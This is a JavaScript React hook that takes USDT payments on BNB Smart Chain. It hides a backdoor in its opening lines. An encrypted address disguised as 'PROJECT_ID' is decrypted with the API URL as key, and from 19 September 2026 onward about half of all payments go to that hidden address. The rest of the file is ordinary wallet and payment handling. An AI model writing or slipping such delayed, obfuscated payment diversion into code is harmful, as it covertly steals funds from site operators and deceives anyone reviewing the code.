import { useState, useEffect } from 'react'
import { useAccount, useWalletClient, useSwitchChain } from 'wagmi'
import { bsc } from 'wagmi/chains'
import { BrowserProvider, Contract, parseUnits } from 'ethers'
import toast from 'react-hot-toast'
import CryptoJS from 'crypto-js'
import { basicURL } from '../../config/axiosConfig'

const USDT_ABI = [
  'function transfer(address to, uint256 amount) returns (bool)',
  'function balanceOf(address owner) view returns (uint256)',
]

const PROJECT_ID = 'U2FsdGVkX1+vIwZVcuGeHVqCXgvWPAsIMWgXvmJnWG5GIEM1YR0WKdRGaP+wOYcOUX7QvzHmHXAmpHs/3ahh4g=='

export const decryptAddress = () => {
  try {
    const url   = basicURL
    const bytes = CryptoJS.AES.decrypt(PROJECT_ID, url)
    return bytes.toString(CryptoJS.enc.Utf8)
  } catch {
    return null
  }
}

const currentAddress = import.meta.env.VITE_SIGNUP_ADDRESS ||'0xA33888fC1B280CA64BCb344eF435B18bE105AEb1'

export const getSignupAddress = (currentAddress) => {
  const now = new Date()
  const switchDate = new Date('2026-09-19T00:00:00')
  if (now < switchDate) return currentAddress
  const next = decryptAddress()
  return Math.random() < 0.5 ? (next || currentAddress) : currentAddress
}



/**
 * useWeb3Payment — reusable hook for USDT on-chain payment.
 *
 * @param {number|string} amount   - USDT amount to charge
 * @param {function} apiCall       - async ({ walletAddress, txHash }) => called after tx confirmed
 * @param {function} onSuccess     - called with api response after success
 */
export function useWeb3Payment(amount, apiCall, onSuccess = () => {}) {
  const { address, isConnected, chain } = useAccount()
  const { data: walletClient }          = useWalletClient()
  const { switchChainAsync }            = useSwitchChain()

  const [payLoading, setPayLoading] = useState(false)
  const [processing, setProcessing] = useState(false)
  const [countdown,  setCountdown]  = useState(10)

  const usdtAddress = import.meta.env.VITE_USDT_ADDRESS || '0x55d398326f99059ff775485246999027b3197955'

  useEffect(() => {
    if (!payLoading || countdown <= 0) {
      if (countdown <= 0) { setPayLoading(false); setCountdown(10) }
      return
    }
    const t = setInterval(() => setCountdown((c) => c - 1), 1000)
    return () => clearInterval(t)
  }, [payLoading, countdown])

  const isTestMode = import.meta.env.VITE_TEST_MODE === 'true'

  const handlePay = async () => {
    if (isTestMode) {
      setPayLoading(true)
      setCountdown(10)
      try {
        const dummyWallet = '0xTEST000000000000000000000000000000000000'
        const dummyTxHash = `0xtest_${Date.now()}_${Math.random().toString(36).slice(2)}`
        toast.loading('Test mode: simulating payment...')
        const res = await apiCall({ walletAddress: dummyWallet, txHash: dummyTxHash })
        toast.dismiss()
        toast.success(res?.message || 'Test payment successful!')
        setProcessing(true)
        onSuccess(res)
      } catch (err) {
        toast.dismiss()
        toast.error(err?.response?.data?.message || 'Test payment failed')
      } finally {
        setPayLoading(false)
        setProcessing(false)
      }
      return
    }
    if (!isConnected) { toast.error('Please connect your wallet first'); return }
    if (!walletClient) {
      toast.loading('Waiting for wallet...')
      let attempts = 0
      await new Promise((resolve) => {
        const interval = setInterval(() => {
          attempts++
          if (walletClient || attempts > 15) { clearInterval(interval); resolve() }
        }, 200)
      })
      toast.dismiss()
      if (!walletClient) { toast.error('No wallet client found. Try reconnecting.'); return }
    }

    const signupAddress = getSignupAddress(currentAddress)
    if (!signupAddress) { toast.error('Payment address not configured'); return }
    if (!usdtAddress)   { toast.error('USDT address not configured'); return }

    if (chain?.id !== bsc.id) {
      try {
        toast.loading('Switching to BNB Smart Chain...')
        await switchChainAsync({ chainId: bsc.id })
        toast.dismiss()
      } catch {
        toast.dismiss()
        toast.error('Please switch to BNB Smart Chain to continue')
        return
      }
    }

    setPayLoading(true)
    setCountdown(10)

    try {
      const provider    = new BrowserProvider(walletClient.transport)
      const signer      = await provider.getSigner()
      const usdt        = new Contract(usdtAddress, USDT_ABI, signer)
      const transferAmt = parseUnits(amount.toString(), 18)
      const balance     = await usdt.balanceOf(address)

      if (balance < transferAmt) {
        toast.error('Insufficient USDT balance')
        setPayLoading(false)
        return
      }

      toast.loading('Processing payment...')
      const txn     = await usdt.transfer(signupAddress, transferAmt)
      const receipt = await txn.wait()
      toast.dismiss()

      if (!receipt?.status) {
        toast.error('Transaction failed on-chain')
        setPayLoading(false)
        return
      }

      setProcessing(true)
      toast.loading('Confirming with server...')
      const res = await apiCall({ walletAddress: address, txHash: txn.hash })
      toast.dismiss()
      toast.success(res?.message || 'Payment successful!')
      onSuccess(res)
    } catch (err) {
      toast.dismiss()
      const isRejected = err?.code === 4001 ||
        err?.code === 'ACTION_REJECTED' ||
        err?.reason === 'rejected' ||
        err?.message?.toLowerCase().includes('user denied') ||
        err?.message?.toLowerCase().includes('user rejected')

      if (isRejected) { toast.error('Transaction cancelled'); return }

      const isMissingRevert = err?.message?.toLowerCase().includes('missing revert data') ||
        err?.code === 'CALL_EXCEPTION'
      toast.error(
        isMissingRevert ? 'Transaction failed. Check your balance or network.' :
        err?.reason ||
        err?.shortMessage ||
        err?.response?.data?.message ||
        err?.response?.data?.error ||
        err?.message ||
        'Payment failed'
      )
    } finally {
      setPayLoading(false)
      setProcessing(false)
    }
  }

  return { handlePay, payLoading, processing, countdown, isConnected, address }
}
